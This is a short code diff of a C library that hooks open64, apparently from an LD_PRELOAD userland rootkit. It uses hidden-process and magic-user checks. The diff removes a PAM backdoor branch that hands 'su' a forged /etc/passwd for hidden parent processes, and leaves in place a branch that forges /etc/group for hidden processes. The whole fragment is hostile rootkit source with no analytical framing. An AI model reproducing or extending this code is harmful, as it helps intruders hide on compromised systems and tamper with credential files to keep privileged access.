@@ -73,13 +73,8 @@ int open(const char *pathname, int flags, mode_t mode){
 int open64(const char *pathname, int flags, mode_t mode){
     hook(COPEN64);
 
-#ifdef USE_PAM_BD
-    if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
-        return fileno(forgepasswd(pathname));
-
     if(hidden_pid() && !strcmp(pathname, "/etc/group\0"))
         return fileno(forgegroups(pathname));
-#endif
 
     if(magicusr()){
         int ret = (long)call(COPEN64, pathname, flags, mode);
